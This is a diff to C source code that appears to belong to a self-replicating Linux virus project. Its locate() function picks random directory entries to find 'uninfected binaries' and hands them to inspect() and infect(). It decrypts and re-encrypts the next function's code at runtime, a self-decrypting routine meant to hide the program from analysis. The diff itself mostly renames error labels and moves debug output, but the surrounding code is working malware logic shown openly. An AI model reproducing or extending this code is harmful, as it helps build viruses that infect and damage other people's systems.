@@ -1,7 +1,19 @@
 #include "war.h"
 
+/*
+  Locate search aleatory for uninfected binaries.
+  Look at war() func to know which directories are in use.
+*/
+
 void	locate(t_data *data, t_directory *dir)
 {
+
+#ifdef DEBUG
+	char de[] = "locate\t0\n";
+	data->context == true ?	de[7] = 49 : 0;
+	_write(1, de, _strlen(de));
+#endif
+
 	revert_two(&data->key, (char*)war, (size_t)locate - (size_t)war);
 
 	int				fd;
@@ -11,17 +23,12 @@ void	locate(t_data *data, t_directory *dir)
 	char			path[PATH_MAX] = {0};
 	linux_dirent64 *curr = NULL;
 
-#ifdef DEBUG
-	char de[] = "locate\t \n";
-	data->context == true ?	de[7] = 49 : 48;
-	_write(1, de, _strlen(de));
-#endif
 
 	data->context = false;
 	if (_memcpy(path, dir->path[dir->entry], _strlen(dir->path[dir->entry])) != path)
-		goto ERR;
+		goto next;
 	if ((fd = _open(path, O_RDONLY, 0000)) < 0)
-		goto ERR;
+		goto next;
 
    	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
 	{
@@ -33,14 +40,13 @@ void	locate(t_data *data, t_directory *dir)
 	}
 
 	if (_close(fd) < 0 || dir->entry <= 0)
-		goto ERR;
+		goto next;
 
-	_write(1, de, _strlen(de));
-ITER:
+iter:
 	if ((fd = _open(path, O_RDONLY, 0000)) < 0)
-		goto ERR;
+		goto next;
 	if ((stop = _random_number(dir->entry)) < 0)
-		goto ERR;
+		goto next;
 
 	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
 	{
@@ -55,20 +61,19 @@ ITER:
 			break ;
 	}
 	if (_close(fd) < 0)
-		goto ERR;
+		goto next;
 	if (*curr->d_name == '.')
-		goto ITER;
+		goto iter;
 
 	limit = _strlen(path);
 	path[limit++] = '/';
 	if (_memcpy(path + limit, curr->d_name, _strlen(curr->d_name)) != path + limit)
-		goto ERR;
+		goto next;
 	data->context = true;
 
-ERR:
+next:
 
 	update_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
 	revert_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
-
 	inspect(data, path);
 }
